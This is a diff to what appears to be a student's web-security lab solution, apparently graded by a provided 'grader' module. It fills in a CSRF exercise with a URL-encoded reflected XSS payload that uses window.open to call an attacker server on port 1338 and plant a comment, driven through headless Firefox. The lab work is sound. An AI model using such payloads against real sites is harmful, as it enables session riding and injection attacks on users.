@@ -6,8 +6,8 @@ import grader
 import argparse
 
 # NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
-# TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
-TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'
+TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
+# TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'
 
 # NOTE: where you need to update your static IP address of your server
 ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'
@@ -128,8 +128,21 @@ def csrf(level):
     options = Options()
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)
+    secret_msg = 'secretmessagelol'
 
-    # grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.
+    query = '%3Cscript%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fcsrf_target%2Fsecretmessagelol%22)%3B%3C%2Fscript%3E'
+
+    url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_src' + '?query=' + query
+
+    driver.get(url)
+
+    # get comments
+    url = TARGET_SERVER_ENDPOINT + '/' + 'csrf_target'
+    driver.get(url)
+    soup = BeautifulSoup(driver.page_source)
+    comments = soup.find_all('tr')
+
+    grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.
 
     driver.quit()
 
